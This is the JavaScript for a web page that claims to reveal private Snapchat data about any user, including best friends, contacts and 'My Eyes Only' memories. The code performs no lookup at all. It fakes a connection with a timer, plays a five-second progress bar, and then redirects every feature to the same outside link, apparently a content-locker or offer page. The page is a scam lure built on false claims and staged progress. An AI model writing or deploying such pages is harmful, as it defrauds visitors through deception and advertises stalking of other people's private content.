// State variables
let username = ""
let connectionState = "idle" // 'idle', 'connecting', 'connected'
let selectedFeature = null
let progress = 0

// Feature data
const features = [
  {
    icon: "💖",
    title: "Best Friend List",
    description: "Reveal 8 Best friends of any user",
    url: "https://appchecker.space/cl/i/l779kk",
  },
  {
    icon: "🧐",
    title: "Snapping With Mod",
    description: "Find out who they're snapping with",
    url: "https://appchecker.space/cl/i/l779kk",
  },
  {
    icon: "🖼️",
    title: "My Eyes Only",
    description: "Request My Eyes Only memories",
    url: "https://appchecker.space/cl/i/l779kk",
  },
  {
    icon: "👀",
    title: "Snap Score",
    description: "See who checked your snapscore",
    url: "https://appchecker.space/cl/i/l779kk",
  },
  {
    icon: "💬",
    title: "Live Text",
    description: "enable live text feature",
    url: "https://appchecker.space/cl/i/l779kk",
  },
  {
    icon: "📱",
    title: "Snap Recap 2025",
    description: "View 2025 Recap of any user",
    url: "https://appchecker.space/cl/i/l779kk",
  },
]

// DOM Elements
const usernameInput = document.getElementById("username-input")
const connectBtn = document.getElementById("connect-btn")
const idleState = document.getElementById("idle-state")
const connectingState = document.getElementById("connecting-state")
const connectedState = document.getElementById("connected-state")
const connectingUsername = document.getElementById("connecting-username")
const connectedUsername = document.getElementById("connected-username")
const featureCards = document.querySelectorAll(".feature-card")
const popup = document.getElementById("popup")
const popupIcon = document.getElementById("popup-icon")
const popupTitle = document.getElementById("popup-title")
const popupUsername = document.getElementById("popup-username")
const progressFill = document.getElementById("progress-fill")
const progressText = document.getElementById("progress-text")

// Initialize event listeners
usernameInput.addEventListener("input", function () {
  username = this.value
  if (username.trim()) {
    connectBtn.classList.add("active")
  } else {
    connectBtn.classList.remove("active")
  }
})

// Handle connect button click
function handleConnect() {
  if (username.trim() && connectionState === "idle") {
    connectionState = "connecting"
    updateUI()

    setTimeout(() => {
      connectionState = "connected"
      updateUI()
    }, 1500)
  }
}

// Handle change button click
function handleChange() {
  connectionState = "idle"
  username = ""
  selectedFeature = null
  progress = 0
  usernameInput.value = ""
  connectBtn.classList.remove("active")
  updateUI()
}

// Handle feature click
function handleFeatureClick(index) {
  if (connectionState !== "connected") return

  selectedFeature = index
  progress = 0

  // Show popup
  popupIcon.textContent = features[index].icon
  popupTitle.textContent = features[index].title
  popupUsername.textContent = username
  popup.classList.remove("hidden")

  // Disable feature cards
  featureCards.forEach((card) => {
    card.classList.add("disabled")
  })

  // Animate progress bar
  const startTime = Date.now()
  const duration = 5000

  function animate() {
    const elapsed = Date.now() - startTime
    progress = Math.min((elapsed / duration) * 100, 100)

    progressFill.style.width = progress + "%"
    progressText.textContent = Math.round(progress) + "%"

    if (progress < 100) {
      requestAnimationFrame(animate)
    } else {
      setTimeout(() => {
        window.location.href = features[index].url
      }, 200)
    }
  }

  requestAnimationFrame(animate)
}

// Close popup
function closePopup() {
  popup.classList.add("hidden")
  selectedFeature = null
  progress = 0
  progressFill.style.width = "0%"
  progressText.textContent = "0%"

  // Re-enable feature cards
  featureCards.forEach((card) => {
    card.classList.remove("disabled")
  })
}

// Update UI based on state
function updateUI() {
  // Hide all states
  idleState.classList.add("hidden")
  connectingState.classList.add("hidden")
  connectedState.classList.add("hidden")

  // Show current state
  if (connectionState === "idle") {
    idleState.classList.remove("hidden")
    featureCards.forEach((card) => {
      card.classList.add("disabled")
    })
  } else if (connectionState === "connecting") {
    connectingState.classList.remove("hidden")
    connectingUsername.textContent = username
    featureCards.forEach((card) => {
      card.classList.add("disabled")
    })
  } else if (connectionState === "connected") {
    connectedState.classList.remove("hidden")
    connectedUsername.textContent = username
    featureCards.forEach((card) => {
      card.classList.remove("disabled")
    })
  }
}

// Initialize UI
updateUI()
